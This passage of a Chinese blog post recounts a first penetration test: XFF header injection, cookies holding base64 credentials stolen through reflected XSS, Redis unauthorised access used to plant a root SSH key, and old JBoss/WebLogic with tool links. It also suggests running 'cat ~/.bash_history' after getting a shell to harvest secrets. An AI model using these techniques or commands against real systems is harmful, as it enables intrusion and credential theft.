<p>&#x8FD8;&#x6709;&#x4E00;&#x70B9;&#x5C0F;&#x611F;&#x609F;&#x662F; XFF &#x5934;&#x6CE8;&#x5165;&#x662F;&#x771F;&#x7684;&#x5B58;&#x5728;&#xFF0C;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;&#x672C;&#x8EAB;&#x7684;&#x8FC7;&#x7A0B;&#x5C31;&#x662F;&#x628A;&#x4E0D;&#x53EF;&#x80FD;&#x7684;&#x4E8B;&#x53D8;&#x4E3A;&#x53EF;&#x80FD;&#xFF0C;&#x867D;&#x7136;&#x6211;&#x4E4B;&#x524D;&#x4E5F;&#x4E00;&#x76F4;&#x89C9;&#x5F97;&#x8BB2; XFF &#x5934;&#x7684;&#x6CE8;&#x5165;&#x662F;&#x4E3A;&#x4E86;&#x7ED5;&#x8FC7;gpc&#x7684;&#x8FC7;&#x6EE4;&#xFF0C;&#x9700;&#x8981;&#x5F88;&#x5DE7;&#x5408;&#x624D;&#x80FD;&#x5B8C;&#x6210;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x6D4B;&#x8BD5;&#x4E00;&#x4E2A;&#x529E;&#x516C;&#x7CFB;&#x7EDF;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5F00;&#x53D1;&#x8DDF;&#x6211;&#x8BF4;&#x5230;&#x4ED6;&#x4EEC;&#x9700;&#x8981;&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;&#x6BCF;&#x4E2A;&#x4EBA;&#x767B;&#x5F55;&#x7684;IP&#x3002;&#x6240;&#x4EE5;&#x4E3A;&#x4EC0;&#x4E48;&#x6784;&#x6210;&#x8FD9;&#x79CD;&#x6F0F;&#x6D1E;&#x4E5F;&#x5C31;&#x4E0D;&#x5947;&#x602A;&#x4E86;</p>
<h2 id="cookie&#x4E5F;&#x6562;&#x660E;&#x6587;&#x4F20;&#x8F93;&#x7528;&#x6237;&#x540D;&#x5BC6;&#x7801;&#xFF1F;"><a href="#cookie&#x4E5F;&#x6562;&#x660E;&#x6587;&#x4F20;&#x8F93;&#x7528;&#x6237;&#x540D;&#x5BC6;&#x7801;&#xFF1F;" class="headerlink" title="cookie&#x4E5F;&#x6562;&#x660E;&#x6587;&#x4F20;&#x8F93;&#x7528;&#x6237;&#x540D;&#x5BC6;&#x7801;&#xFF1F;"></a>cookie&#x4E5F;&#x6562;&#x660E;&#x6587;&#x4F20;&#x8F93;&#x7528;&#x6237;&#x540D;&#x5BC6;&#x7801;&#xFF1F;</h2><p>&#x8FD9;&#x4E2A;&#x4E5F;&#x662F;&#x771F;&#x7684;&#x7B2C;&#x4E00;&#x6B21;&#x9047;&#x5230;&#xFF0C;&#x6559;&#x79D1;&#x4E66;&#x822C;&#x7684;&#x6F0F;&#x6D1E;&#x2026;</p>
<p>&#x9996;&#x5148;&#x7528;<strong>&#x5F31;&#x5BC6;&#x7801;</strong>&#x8FDB;&#x5165;&#x4E86;&#x7F51;&#x7AD9;&#xFF08;&#x624B;&#x52A8;&#x6ED1;&#x7A3D;&#xFF09;</p>
<p>&#x7136;&#x540E;&#x5728;&#x6D4B;&#x8BD5;&#x5176;&#x4ED6;&#x6F0F;&#x6D1E;&#x7684;&#x65F6;&#x5019;&#x7A81;&#x7136;&#x53D1;&#x73B0;cookie&#x4F7F;&#x7528;&#x660E;&#x6587;&#x4F20;&#x8F93;&#x4E86;&#x7528;&#x6237;&#x540D;&#x5BC6;&#x7801;</p>
<p>&#x7B2C;&#x4E00;&#x4E2A;&#x60F3;&#x5230;&#x7684;&#x5F53;&#x7136;&#x662F;XSS&#xFF0C;XSS&#x5982;&#x679C;&#x80FD;&#x591F;&#x6253;&#x5230;cookie&#x90A3;&#x4E48;&#x5C06;&#x4F1A;&#x662F;&#x5F88;&#x4E25;&#x91CD;&#x7684;&#x95EE;&#x9898;&#x2026;</p>
<p>&#x627E;&#x4E86;&#x4E00;&#x4E0B;&#x5348;XSS&#xFF0C;&#x7EC8;&#x4E8E;&#x5728;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x90A3;&#x5BFB;&#x627E;&#x5230;&#x4E86;&#x4E00;&#x4E2A;&#x53CD;&#x5C04;&#x578B;XSS&#xFF0C;&#x4E14;&#x6CA1;&#x6709;&#x8BBE;&#x7F6E;httponly&#xFF0C;&#x6700;&#x540E;&#x6210;&#x529F;&#x6253;&#x5230;&#x4E86;&#x7ECF;&#x8FC7;base64&#x4F4D;&#x52A0;&#x5BC6;&#x7684;&#x7528;&#x6237;&#x540D;&#x5BC6;&#x7801;</p>
<p><img src="/2019/08/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E5%88%86%E4%BA%AB%E5%92%8C%E5%B0%8F%E7%BB%93/20190826114312-a0f94e06-c7b3-1.png" alt></p>
<p><img src="/2019/08/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E5%88%86%E4%BA%AB%E5%92%8C%E5%B0%8F%E7%BB%93/20190822193622-112f0a98-c4d1-1.png" alt></p>
<h2 id="Redis&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;"><a href="#Redis&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;" class="headerlink" title="Redis&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;"></a>Redis&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;</h2><p>Redis&#x56E0;&#x914D;&#x7F6E;&#x4E0D;&#x5F53;&#x53EF;&#x4EE5;&#x5BFC;&#x81F4;&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#xFF0C;&#x88AB;&#x653B;&#x51FB;&#x8005;&#x6076;&#x610F;&#x5229;&#x7528;&#x3002;&#x5F53;&#x524D;&#x6D41;&#x884C;&#x7684;&#x9488;&#x5BF9;Redis&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x7684;&#x4E00;&#x79CD;&#x65B0;&#x578B;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#xFF0C;&#x5728;&#x7279;&#x5B9A;&#x6761;&#x4EF6;&#x4E0B;&#xFF0C;&#x5982;&#x679C;Redis&#x4EE5;root&#x8EAB;&#x4EFD;&#x8FD0;&#x884C;&#xFF0C;&#x9ED1;&#x5BA2;&#x53EF;&#x4EE5;&#x7ED9;root&#x8D26;&#x6237;&#x5199;&#x5165;SSH&#x516C;&#x94A5;&#x6587;&#x4EF6;&#xFF0C;&#x76F4;&#x63A5;&#x901A;&#x8FC7;SSH&#x767B;&#x5F55;&#x53D7;&#x5BB3;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x53EF;&#x5BFC;&#x81F4;&#x670D;&#x52A1;&#x5668;&#x6743;&#x9650;&#x88AB;&#x83B7;&#x53D6;&#x548C;&#x6570;&#x636E;&#x5220;&#x9664;&#x3001;&#x6CC4;&#x9732;&#x6216;&#x52A0;&#x5BC6;&#x52D2;&#x7D22;&#x4E8B;&#x4EF6;&#x53D1;&#x751F;&#xFF0C;&#x4E25;&#x91CD;&#x5371;&#x5BB3;&#x4E1A;&#x52A1;&#x6B63;&#x5E38;&#x670D;&#x52A1;&#x3002;&#x3000;&#x3000;&#x90E8;&#x5206;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;Redis &#x7ED1;&#x5B9A;&#x5728; 0.0.0.0:6379&#xFF0C;&#x5E76;&#x4E14;&#x6CA1;&#x6709;&#x5F00;&#x542F;&#x8BA4;&#x8BC1;&#xFF08;&#x8FD9;&#x662F;Redis &#x7684;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#xFF09;</p>
<p>&#x8FD9;&#x4E2A;&#x771F;&#x7684;&#x86EE;&#x591A;&#x516C;&#x53F8;&#x90FD;&#x5B58;&#x5728;&#xFF0C;&#x6CA1;&#x6709;&#x63A5;&#x89E6;&#x8FC7;&#x7684;&#x8001;&#x54E5;&#x5EFA;&#x8BAE;&#x8865;&#x5145;&#x4E00;&#x4E0B;&#x2026;</p>
<p>Freebuf&#x4E0A;&#x6709;&#x7BC7;&#x6587;&#x7AE0;&#x5199;&#x5F97;&#x5F88;&#x8BE6;&#x7EC6;&#x2026;</p>
<p><a href="https://www.freebuf.com/column/158065.html" target="_blank" rel="noopener">Redis&#x672A;&#x6388;&#x6743;&#x8BBF;&#x95EE;&#x8BE6;&#x89E3;</a></p>
<p>&#x4E00;&#x628A;&#x68AD;&#x8FDB;&#x53BB;&#x8FD8;&#x662F; root &#x6743;&#x9650;&#x2026;</p>
<p>&#x7531;&#x4E8E;&#x5168;&#x662F;&#x654F;&#x611F;&#x6570;&#x636E;&#x5C31;&#x4E0D;&#x8D34;&#x56FE;&#x4E86;</p>
<h2 id="&#x5404;&#x79CD;&#x4E2D;&#x95F4;&#x4EF6;&#x7684;&#x6F0F;&#x6D1E;"><a href="#&#x5404;&#x79CD;&#x4E2D;&#x95F4;&#x4EF6;&#x7684;&#x6F0F;&#x6D1E;" class="headerlink" title="&#x5404;&#x79CD;&#x4E2D;&#x95F4;&#x4EF6;&#x7684;&#x6F0F;&#x6D1E;"></a>&#x5404;&#x79CD;&#x4E2D;&#x95F4;&#x4EF6;&#x7684;&#x6F0F;&#x6D1E;</h2><p>&#x5404;&#x79CD;&#x4E2D;&#x95F4;&#x4EF6;&#x7684;&#x6F0F;&#x6D1E;&#x7684;&#x8BDD;&#x5728;&#x5404;&#x5927;&#x8BBA;&#x575B;&#x90FD;&#x6709;&#x5F88;&#x8BE6;&#x7EC6;&#x7684;&#x6587;&#x7AE0;&#xFF0C;&#x5927;&#x5BB6;&#x53EF;&#x4EE5;&#x81EA;&#x884C;&#x67E5;&#x9605;</p>
<p>&#x4E00;&#x70B9;&#x5C0F;&#x611F;&#x609F;&#x5C31;&#x662F;&#xFF0C;&#x5F88;&#x591A;&#x516C;&#x53F8;&#x7528;&#x7684;&#x7248;&#x672C;&#x771F;&#x7684;&#x5F88;&#x8001;&#x5F88;&#x8001;&#xFF0C;&#x800C;&#x4E14;&#x51E0;&#x4E4E;&#x4E0D;&#x6253;&#x8865;&#x4E01;&#x2026;&#x867D;&#x7136;&#x53EF;&#x80FD;&#x6709;&#x7684;&#x65F6;&#x5019; IIS &#xFF0C;Nginx&#x90A3;&#x4E9B;&#x89E3;&#x6790;&#x6F0F;&#x6D1E;&#x6CA1;&#x529E;&#x6CD5;&#x4F7F;&#x7528;(&#x771F;&#x7684;&#x633A;&#x96BE;&#x9047;&#x5230;&#x4E0A;&#x4F20;&#x70B9;&#x7684;)&#x2026;&#x4F46;&#x662F;&#x5982;&#x679C;&#x770B;&#x5230;&#x8001;&#x4E00;&#x70B9;&#x7248;&#x672C;&#x7684; JBoss &#x3001; weblogic &#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x5F88;&#x591A;&#x5DE5;&#x5177;&#x4E86;</p>
<p>&#x4EE5;&#x4E0B;&#x63D0;&#x4F9B;&#x4E00;&#x4E9B;&#x597D;&#x7528;&#x7684;&#x5DE5;&#x5177;</p>
<p><a href="https://www.freebuf.com/sectool/92011.html" target="_blank" rel="noopener">Java&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x96C6;&#x6210;&#x5DE5;&#x5177;</a></p>
<p><a href="https://www.anquanke.com/post/id/85681" target="_blank" rel="noopener">&#x3010;&#x6280;&#x672F;&#x5206;&#x4EAB;&#x3011;Java RMI &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x68C0;&#x6D4B;&#x5DE5;&#x5177;&#x7684;&#x7F16;&#x5199;</a></p>
<p><a href="https://github.com/dr0op/WeblogicScan" target="_blank" rel="noopener">WeblogicScan</a></p>
<h1 id="&#x5199;&#x5728;&#x6700;&#x540E;"><a href="#&#x5199;&#x5728;&#x6700;&#x540E;" class="headerlink" title="&#x5199;&#x5728;&#x6700;&#x540E;"></a>&#x5199;&#x5728;&#x6700;&#x540E;</h1><p>&#x6E17;&#x900F;&#x6D4B;&#x8BD5;&#x4E2D;&#xFF0C;&#x5DE5;&#x5177;&#xFF0C;&#x7ECF;&#x9A8C;&#xFF0C;&#x8FD8;&#x6709;&#x7075;&#x6D3B;&#x7684;&#x601D;&#x7EF4;&#x90FD;&#x662F;&#x5F88;&#x91CD;&#x8981;&#x7684;&#x4E1C;&#x897F;&#xFF08;&#x867D;&#x7136;&#x81EA;&#x5DF1;&#x4E00;&#x6837;&#x4E5F;&#x6CA1;&#x6709;&#xFF09;&#x2026;</p>
<p>&#x6709;&#x7684;&#x65F6;&#x5019;&#x8FDE;&#x4E0A;&#x4E86;shell&#x4E4B;&#x540E;&#xFF0C;&#x7136;&#x540E;&#x5982;&#x540C;&#x673A;&#x5668;&#x4EBA;&#x4E00;&#x822C;&#x7684;&#x53CD;&#x5F39;shell&#xFF0C;&#x6267;&#x884C; <code>whoami</code>&#xFF0C;&#x53D1;&#x73B0;&#x6743;&#x9650;&#x4E0D;&#x591F;&#x5C31;&#x8FDB;&#x4E00;&#x6B65;&#x67E5;&#x770B;&#x7CFB;&#x7EDF;&#x4FE1;&#x606F;&#xFF0C;&#x63A5;&#x7740;&#x5C1D;&#x8BD5;&#x5404;&#x79CD;&#x63D0;&#x6743;&#x7684;&#x64CD;&#x4F5C;&#x3002;&#x5176;&#x5B9E;&#x53EF;&#x80FD;<strong>&#x6709;&#x7684;&#x65F6;&#x5019;&#x8FD9;&#x4E9B;&#x64CD;&#x4F5C;&#x6CA1;&#x6709;&#x5FC5;&#x8981;</strong>&#xFF0C;&#x53EF;&#x80FD;&#x6700;&#x7EC8;&#x7684;&#x76EE;&#x6807;&#x90FD;&#x662F;&#x62FF;&#x5230;&#x4E00;&#x4E9B;&#x4FE1;&#x606F;&#x6216;&#x8005;&#x6570;&#x636E;&#x3002;&#x6240;&#x4EE5;&#x6839;&#x636E;&#x5B9E;&#x9645;&#x60C5;&#x51B5;&#x5224;&#x65AD;&#x4E00;&#x4E0B;&#x662F;&#x5426;&#x9700;&#x8981;&#x63D0;&#x6743;&#xFF0C;&#x662F;&#x4E00;&#x4E2A;&#x63D0;&#x9AD8;&#x6548;&#x7387;&#x4E0D;&#x9519;&#x7684;&#x529E;&#x6CD5;&#x3002;</p>
<p><strong>&#x6B64;&#x5916;&#xFF0C;&#x4E00;&#x4E2A; <code>cat ~/.bash_history</code> &#x547D;&#x4EE4;&#x6709;&#x65F6;&#x5019;&#x53EF;&#x80FD;&#x4F1A;&#x7ED9;&#x4F60;&#x5E26;&#x6765;&#x4E00;&#x4E9B;&#x60CA;&#x559C;</strong></p>
<p>&#x6700;&#x540E;&#xFF0C;&#x6839;&#x636E;&#x4FE1;&#x5B89;&#x4E4B;&#x8DEF;&#x7684;<a href="https://mp.weixin.qq.com/s/U2MqcjA_YmMlajJzvDCZZw" target="_blank" rel="noopener">&#x53F2;&#x4E0A;&#x6700;&#x5F3A;&#x5185;&#x7F51;&#x6E17;&#x900F;&#x77E5;&#x8BC6;&#x70B9;&#x603B;&#x7ED3;</a>,&#x8865;&#x5145;&#x4E86;&#x91CC;&#x9762;&#x7684;&#x4E00;&#x70B9;&#x4E1C;&#x897F;&#x3002;<br>&#x5206;&#x4EAB;&#x7ED9;&#x5927;&#x5BB6; <a href="https://p2hm1n.github.io/2019/08/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%B0%8F%E7%BB%93/" target="_blank" rel="noopener">&#x5185;&#x7F51;&#x6E17;&#x900F;&#x4E4B;&#x5E38;&#x7528;&#x547D;&#x4EE4;&#x5C0F;&#x7ED3;</a></p>
<p><strong>&#x672C;&#x6587;&#x4EC5;&#x9650;&#x6280;&#x672F;&#x7814;&#x7A76;&#x4E0E;&#x8BA8;&#x8BBA;&#xFF0C;&#x4E25;&#x7981;&#x7528;&#x4E8E;&#x975E;&#x6CD5;&#x7528;&#x9014;&#xFF0C;&#x5426;&#x5219;&#x4EA7;&#x751F;&#x7684;&#x4E00;&#x5207;&#x540E;&#x679C;&#x81EA;&#x884C;&#x627F;&#x62C5;&#x3002;</strong></p>
</body></html>]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
</search>
